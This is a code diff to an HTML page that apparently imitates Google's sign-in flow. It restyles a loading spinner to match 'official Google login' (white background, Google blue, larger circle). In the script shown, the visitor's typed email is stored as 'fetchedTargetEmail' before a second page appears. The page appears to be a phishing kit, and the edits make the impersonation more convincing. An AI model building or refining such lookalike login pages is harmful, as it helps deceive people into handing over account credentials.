@@ -135,33 +135,34 @@
         }
 
         /* =========================================
-           OFFICIAL GOOGLE SPINNER LOADER
+           OFFICIAL BIG GOOGLE LOGIN SPINNER
            ========================================= */
         #googleSpinnerOverlay {
             position: fixed;
             top: 0; left: 0; width: 100vw; height: 100vh;
-            background-color: rgba(255, 255, 255, 0.95);
+            background-color: #ffffff; /* Pure white background like official Google login */
             display: none;
             justify-content: center;
             align-items: center;
             z-index: 99999;
         }
         #googleSpinnerOverlay.dark-mode {
-            background-color: rgba(13, 17, 23, 0.95);
+            background-color: #0d1117; /* Dark background transition for Page 2 */
         }
 
+        /* Bada aur smooth loading circle */
         .circular-loader {
             animation: rotate 2s linear infinite;
-            height: 45px;
-            width: 45px;
+            height: 100px; /* Big size */
+            width: 100px;  /* Big size */
         }
 
         .circular-loader circle {
-            stroke: #1a73e8;
-            stroke-width: 4;
+            stroke: #1a73e8; /* Official Google Blue */
+            stroke-width: 3.5; /* Smooth thin line */
             stroke-dasharray: 1, 200;
             stroke-dashoffset: 0;
-            animation: dash 1.5s ease-in-out infinite, colorRotate 6s ease-in-out infinite;
+            animation: dash 1.5s ease-in-out infinite;
             stroke-linecap: round;
             fill: none;
         }
@@ -174,13 +175,6 @@
             0% { stroke-dasharray: 1, 200; stroke-dashoffset: 0; }
             50% { stroke-dasharray: 89, 200; stroke-dashoffset: -35; }
             100% { stroke-dasharray: 89, 200; stroke-dashoffset: -124; }
-        }
-
-        @keyframes colorRotate {
-            100%, 0% { stroke: #4285F4; }
-            40% { stroke: #EA4335; }
-            66% { stroke: #FBBC05; }
-            80%, 90% { stroke: #34A853; }
         }
 
         /* =========================================
@@ -484,6 +478,12 @@
             .container-dark input { padding: 14px 15px; font-size: 1rem; }
             .container-dark input::placeholder { font-size: 0.85rem; }
             .google-card { padding: 25px 20px; }
+            
+            /* Make spinner responsive for mobile */
+            .circular-loader {
+                height: 80px;
+                width: 80px;
+            }
         }
     </style>
 </head>
@@ -642,7 +642,7 @@
                 e.preventDefault();
                 fetchedTargetEmail = p1EmailInput.value;
                 
-                // Show Google Loading Overlay
+                // Show BIG Google Loading Overlay
                 googleSpinner.style.display = 'flex';
                 googleSpinner.classList.remove('dark-mode'); 
 
